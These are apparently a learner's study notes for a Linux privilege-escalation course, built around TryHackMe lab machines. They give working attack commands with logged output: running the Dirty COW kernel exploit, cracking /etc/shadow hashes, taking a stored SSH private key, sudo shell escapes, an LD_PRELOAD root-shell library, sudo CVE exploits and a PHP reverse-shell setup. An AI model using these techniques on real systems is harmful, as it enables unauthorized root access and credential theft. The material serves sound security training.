# Linux Privilege Escalation for Beginners
https://academy.tcm-sec.com/courses/1154399/lectures/24799431

---
https://tryhackme.com/r/room/linuxprivescarena


Tools Folder: /home/user/tools/

---

# Initial Enumeration

```
# System Info:
ssh TCM@10.10.22.59 
whoami
id
uname -a
arp -a
sudo -l
hostname
cat /proc/version 
cat /etc/issue 
lscpu
ps aux
ps aux | grep root


# Only User info:
cat /etc/passwd
cat /etc/passwd | cut -d : -f 1
cat /etc/shadow
cat /etc/group

history


sudo su -

# Network Info:

ip a
route
ip route
arp -a
ip neigh
netstat -ano
netstat -tpln


# Password Info:
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null

> Find Password in the `History Command`
history
locate password | more
find / -name id_rsa 2> /dev/null

```
---

================================================================
# Exploring Automated Tools: https://academy.tcm-sec.com/courses/1154399/lectures/24799431

Resources for this video:

LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum - https://github.com/rebootuser/LinEnum

Linux Exploit Suggester - https://github.com/mzet-/linux-exploit-suggester

Linux Priv Checker - https://github.com/sleventyeleven/linuxprivchecker



## Exploring Automated Tools
----------------------------


```
# Automatic Tools:
cd /tmp
ls -lsa

wget http://192.168.4.51/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
wget http://192.168.4.51/linenum.sh
chmod +x linenum.sh 
wget http://192.168.4.51/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh 
./linux-exploit-suggester.sh

```
---

===============================================================

# Kernel Exploits Overview
https://academy.tcm-sec.com/courses/1154399/lectures/24799428

Kernel Exploits - https://github.com/lucyoa/kernel-exploits


> https://www.exploit-db.com/exploits/40839

> [!Note]
> Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
> EDB-ID: 40839 | CVE: 2016-5195


> Dirty Cow: https://dirtycow.ninja/

`CODE`: https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c

```
* $ gcc -pthread c0w.c  -o c0w
* $ ./c0w
```
================================================================

## Kernel Exploit:
```
backup.tar.gz  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ wget http://10.9.0.139/c0w.c
--2024-08-11 11:06:10--  http://10.9.0.139/c0w.c
Connecting to 10.9.0.139:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4369 (4.3K) [text/x-csrc]
Saving to: “c0w.c”

100%[=====================================================>] 4,369       --.-K/s   in 0.002s  

2024-08-11 11:06:11 (2.34 MB/s) - “c0w.c” saved [4369/4369]

TCM@debian:/tmp$ ls
backup.tar.gz  c0w.c  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ gcc -pthread c0w.c  -o c0w
TCM@debian:/tmp$ ls
backup.tar.gz  c0w  c0w.c  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ ./c0w 
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 6e9d000

id
madvise 0

ptrace 0

TCM@debian:/tmp$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:/tmp$ ls
backup.tar.gz  bak  c0w  c0w.c  linenum.sh  linpeas.sh  useless
TCM@debian:/tmp$ passwd
root@debian:/tmp# ls
backup.tar.gz  bak  c0w  c0w.c  linenum.sh  linpeas.sh  useless
root@debian:/tmp# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/tmp#
```

---

=========================================================================================================
# Escalation Path: Passwords & File Permissions

https://academy.tcm-sec.com/courses/1154399/lectures/24799427

## Escalation via Stored Passwords
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#looting-for-passwords

OR

Use Automating Tools: Linpeas.sh or LinEnum.sh

```
root@debian:/home/user# ls
myvpn.ovpn  tools
root@debian:/home/user# cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

root@debian:/home/user# cat /etc/openvpn/auth.txt
user
password321
root@debian:/home/user# history |grep pass
  250  cp /tmp/bak /usr/bin/passwd
  251  passwd
  255  cp passwd /usr/bin/passwd
  279  history |grep pass
root@debian:/home/user# history | grep pass
  250  cp /tmp/bak /usr/bin/passwd
  251  passwd
  255  cp passwd /usr/bin/passwd
  279  history |grep pass
  280  history | grep pass
root@debian:/home/user# exit
exit
TCM@debian:~$ pwd
/home/user
TCM@debian:~$ 

```
---

## Escalation via Weak File Permissions

COPY the /etc/passwd and /etc/shadow

Use `unshadow`:


```
                                                                                              
┌──(kali㉿kali)-[~]
└─$ unshadow passwd shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:!:101:103::/var/spool/exim4:/bin/false
sshd:*:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:*:103:65534::/var/lib/nfs:/bin/false
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash

```

Now use the `hastcat`:

> Search for `hashcat hash type` in Google

`$6$`

Example hashes: 
> https://hashcat.net/wiki/doku.php?id=example_hashes
-------------------------------------

1800 	sha512crypt $6$, SHA512 (Unix) 2 	$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/ 

-----------------------------------------------------------------------------------------------------------------------------------------------------

Hashcat Command:
------------------

```
# Go to Hashcat folder in Windows Host machine

hashcat.exe -m 1800 creds.txt rockyou.txt -o


┌──(kali㉿kali)-[~]
└─$ sudo hashcat -m 1800 unshadow rockyou.txt -O


$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
Cracking performance lower than expected?                 

...
...
...

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 
q

```

> Root pasword: password123

---

##  Escalation via SSH Keys
------------------------------

> https://academy.tcm-sec.com/courses/1154399/lectures/24799433

Ref: PayloadsAllTheThings/Methodology and Resources/Linux - Privilege Escalation.md

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

> [Looting for passwords](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#looting-for-passwords)

find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

======================================================================

> [!Note]
> id_rsa : we keep.

> id_rsa.pub: stored in Authorised_key file in .ssh folder into the Server

========================================================================

```
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ cat /backups/supersecretkeys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----
TCM@debian:~$ 

```

### In another Terminal:
-------------------------

```
┌──(kali㉿kali)-[~]
└─$ cd linuxprivescarena 
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ gedit id_rsa  
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ chmod 600 id_rsa    
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ ssh -i id_rsa root@10.10.22.59                  
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 23:31:40 2020 from 192.168.4.51
root@debian:~# 

root@debian:~# ls -la
total 44
drwx------  4 root root 4096 Jun 17  2020 .
drwxr-xr-x 22 root root 4096 Jun 17  2020 ..
drwx------  2 root root 4096 May 12  2017 .aptitude
-rw-------  1 root root 5204 Aug 11 13:48 .bash_history
-rw-r--r--  1 root root  564 May 13  2017 .bashrc
-rw-------  1 root root   39 May 13  2017 .lesshst
-rw-------  1 root root   39 Jun 18  2020 .nano_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Jun 17  2020 .ssh
-rw-------  1 root root  513 May 14  2017 .viminfo
-rw-------  1 root root    0 May 14  2017 .viminfo.tmp
root@debian:~# cd .ssh/
root@debian:~/.ssh# ls
authorized_keys
root@debian:~/.ssh# ls -la
total 12
drwx------ 2 root root 4096 Jun 17  2020 .
drwx------ 4 root root 4096 Jun 17  2020 ..
-rw------- 1 root root  563 Jun 17  2020 authorized_keys
root@debian:~/.ssh# cat authorized_keys 

```

---

# Escalation Path: Sudo
------------------------
> https://academy.tcm-sec.com/courses/1154399/lectures/24799432

### Resources for this video:

> GTFOBins - https://gtfobins.github.io/

> Linux PrivEsc Playground - https://tryhackme.com/room/privescplayground

===============================================================================

## Escalation via Sudo Shell Escaping
https://academy.tcm-sec.com/courses/1154399/lectures/24799430

E.g.
> https://gtfobins.github.io/gtfobins/vim/

### vim

```
> sudo -l
> sudo vim -c ':!/bin/sh'


TCM@debian:~$ sudo vim -c ':!/bin/sh'

sh-4.1# ^C
sh-4.1# ^C
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# whoami
root
sh-4.1# su tcm
Unknown id: tcm
sh-4.1# su TCM
TCM@debian:~$ 

```

https://gtfobins.github.io/gtfobins/awk/#sudo

### awk

```
TCM@debian:~$ sudo awk 'BEGIN {system("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# whoami
root
sh-4.1# exit
exit
TCM@debian:~$ 

```
---

## Escalation via Intended Functionality
https://academy.tcm-sec.com/courses/1154399/lectures/24799425

Resources for this video:

wget example - https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/

======================================================================================

> Apache2
---------

> Search in Google and Type: sudo apache2 privilege escalation

https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/

> /usr/sbin/apache2

```
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
TCM@debian:~$ 

```

---

##  Escalation via LD_PRELOAD

> [!Note]
> We are loading before any other Libraries.

shell.c  
--------
> Code Ref: (https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
``` 

> [!Note]
> Use to Compile:
>Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
>

> Execute any binary with the LD_PRELOAD to spawn a shell : 
`sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`


```
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
TCM@debian:~$ nano shell.c
TCM@debian:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
TCM@debian:~$ ls
myvpn.ovpn  shell.c  shell.so  tools
TCM@debian:~$ sudo LD_PRELOAD=shell.so  apache2
ERROR: ld.so: object 'shell.so' from LD_PRELOAD cannot be preloaded: ignored.
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~$ sudo LD_PRELOAD=/home/user/shell.so  apache2
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# whoami
root
sh-4.1# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
TCM@debian:~$ 


```

### In Attacker/Attacking Machine:

> We can use `John` to Cracked the Credential or Hash

> Copy the Full Hack in a .txt File:
E.g.

> root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::


```
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ nano hash-tcm.txt
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ john --wordlist=../rockyou.txt hash-tcm.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)     
1g 0:00:00:01 DONE (2024-08-12 05:25) 0.9009g/s 1268p/s 1268c/s 1268C/s cuties..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                               
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ 


``` 
---

## Challenge Overview

Resources for this video:

dirsearch - https://github.com/maurosoria/dirsearch

Exploit-DB for Simple CMS - https://www.exploit-db.com/exploits/46635
---

nmap -A -T4 -p- <IP_ADDRESS>

1. Check the FTP first.
ftp <IP>
anonymous
password: anonymous


2. Check Apache

We get the Apache Version

we will go for `dirsearch`

python3 dirsearch.py -u http://10.10.149.152 -e php,html -x 400,401,403

> Result in Directory: /simple 

we can file the CMS simple 2.2.8 exploit => in the Google search

We can downlaoad the python script.

Search:  top 100 seclist

> https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt

```
gedit top-100-passwd.txt
cd /Downloads
python 46635.py -u http://<Ip>/simple --crack -w /root/Downloads/top-100-passwd.txt
```
We get the ID and Password Hash

Next we will Do the `ssh`:

history
cat .bash_history
sudo -l

# go to GTFOBins
# Search for : vim
# sudo: sudo vim -c ':!/bin/sh'
id
exit

> For quit OR exit
```
:!bash
su TCM
```
E.g:

```
TCM@debian:~$ sudo vim -c ':!/bin/sh'

sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit

Press ENTER or type command to continue
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# exit
exit

Press ENTER or type command to continue
/bin/bash: q: command not found

shell returned 127

Press ENTER or type command to continue
/bin/bash: q: command not found

shell returned 127

Press ENTER or type command to continue
root@debian:/home/user# su TCM
TCM@debian:~$ 

```

---

# Overview about CVE:

## CVE-2019-14287 Overview
Resources for this video:

Exploit-DB for CVE-2019-14287 - https://www.exploit-db.com/exploits/47502
============================================================================

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
    
> So user hacker can't run /bin/bash as root (!root)

EXPLOIT: 

sudo -u#-1 /bin/bash

> [!Note]
> Description :
> Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the `sudo priv`
`-u#-1` returns as `0` which is `root's id`

```
Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#
```

## Escalation via CVE-2019-14287
Resources for this video:

Exploit-DB for CVE-2019-14287 - https://www.exploit-db.com/exploits/47502

### Sudo Security Bypass
A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series
Walkthrough: https://tryhackme.com/r/room/sudovulnsbypass

```
┌──(kali㉿kali)-[~/linuxprivescarena]
└─$ ssh -p 2222 tryhackme@10.10.87.230
The authenticity of host '[10.10.87.230]:2222 ([10.10.87.230]:2222)' can't be established.
ED25519 key fingerprint is SHA256:4bgDOPxI7PFcv5CMfQYEkO7uBqKjLKhd7zZwmE8uwbQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.87.230]:2222' (ED25519) to the list of known hosts.
tryhackme@10.10.87.230's password: 
Last login: Fri Feb  7 00:14:41 2020 from 192.168.1.151
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# id
uid=0(root) gid=1000(tryhackme) groups=1000(tryhackme)
root@sudo-privesc:~# whoami
root
root@sudo-privesc:~# ls
root@sudo-privesc:~# ls -la
total 24
drwxr-xr-x 2 tryhackme tryhackme 4096 Feb  6  2020 .
drwxr-xr-x 4 root      root      4096 Feb  6  2020 ..
-rw------- 1 root      tryhackme   45 Feb  7  2020 .bash_history
-rw-r--r-- 1 tryhackme tryhackme  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tryhackme tryhackme 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 tryhackme tryhackme  807 Apr  4  2018 .profile
root@sudo-privesc:~# cd /root
root@sudo-privesc:/root# ls
root.txt
root@sudo-privesc:/root# cat root.txt 
THM{l33t_s3cur1ty_bypass}
root@sudo-privesc:/root# 

```

---

## Overview and Escalation via CVE-2019-18634
https://academy.tcm-sec.com/courses/1154399/lectures/24799420

==============================================

Resources for this video:

Exploit for CVE-2019-18634 - https://github.com/saleemrashid/sudo-cve-2019-18634

> In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. 
Reference: https://nvd.nist.gov/vuln/detail/CVE-2019-18634

> sudo can be configured by editing a configuration file on your system. In this case that file is called `/etc/sudoers`

> We can change the `sudo` configuration File: `sudo visudo` in the `/etc/sudoers` file

>[!Note]
> you can add things to the `/etc/sudoers` file in order to give lower-privileged users extra permissions. For this exploit we're more interested in one of the other options available: specifically an option called `pwfeedback`. This option is purely `aesthetic`, and is usually `turned off by default`. 

> CVE-2019-18634 is a `Buffer Overflow` attack to get root permissions. It has been patched, but affects versions of sudo earlier than `1.8.26`.

```
sudo cat /etc/sudoers

sudo -V
wget 
gcc -o <output-file> <source-file>
gcc -o exploit exploit.c 


```

Use TryhackMe Room: https://tryhackme.com/r/room/sudovulnsbof

```
tryhackme@sudo-bof:~$ ./exploit 
[sudo] password for tryhackme: 
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
# gcc
sh: 2: gcc: not found
# exit
sudo: 1 incorrect password attempt
tryhackme@sudo-bof:~$ ./exploit 
[sudo] password for tryhackme: 
Sorry, try again.
# ls
exploit
# pwd
/home/tryhackme
# cd /root
# ls
root.txt
# cat root.txt
THM{buff3r_0v3rfl0w_rul3s}
# 


```
---

# Part - 2: 
---

# Escalation Path: SUID
## SUID Overview


- FOr owner we see the `s` -> means SUID
- For Group we see the `s` -> means GUID
- For Others we see the `t` -> means sticky Bit.

```
find / -perm -u=s -type f 2>/dev/null
```

---

## Gaining a Foothold
https://tryhackme.com/r/room/vulnversity

## Vulnversity
Learn about active recon, web app attacks and privilege escalation.


```

nmap -A -T4 -p- <IP_Address>

Look for the FTP

We can see the Vuln University Website.

We can use Burp suite and Foxy Proxy.

We can use the `dirsearch`

python3 dirsearch.py -u http://<IP> -e html -x 400,401,403

.php extension not allowed 

Go to Pentest Monkey.
- Link: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Reverse Shell Link: https://github.com/pentestmonkey/php-reverse-shell
use the .php5 extension

Payload can be with different .php extension: 
.php
.php3
.php4
.php5
.phtml


We can visit in `uploads` folder

Find : shell.phtml

# In Attacker Machine
-----------------------
nc -nvlp 4444
pwd
ls
whoami
id


```

---
=============================================================================================================

## Escalation via SUID

https://tryhackme.com/r/room/vulnversity

### Reconnaissance
> Nmap is a free, open-source and powerful tool used to discover hosts and services on a computer network.
```
# Scan the box
nmap -sV 10.10.183.170

┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.10.183.170
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 10:49 CEST
Nmap scan report for 10.10.183.170
Host is up (0.29s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        VERSION
21/tcp    open     ftp            vsftpd 3.0.3
22/tcp    open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp   open     netbios-ssn    Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn    Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
1700/tcp  filtered mps-raft
2020/tcp  filtered xinupageserver
3128/tcp  open     http-proxy     Squid http proxy 3.5.12
3300/tcp  filtered ceph
3333/tcp  open     http           Apache httpd 2.4.18 ((Ubuntu))
5226/tcp  filtered hp-status
33354/tcp filtered unknown
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 234.58 seconds

```

Table:

| Nmap flag |	Description |
| --- | --- |
| -sV |	Attempts to determine the version of the services running |
| -p <x> or -p- | Port scan for port <x> or scan all ports |
| -Pn |	Disable host discovery and scan for open ports |
| -A | Enables OS and version detection, executes in-build scripts for further enumeration |
| -sC |	Scan with the default Nmap scripts |
| -v | Verbose mode |
| -sU |	UDP port scan |
| -sS |	TCP SYN port scan |

### Locating directories using Gobuster

```
gobuster dir -u http://10.10.183.170:3333 -w 

┌──(kali㉿kali)-[~]
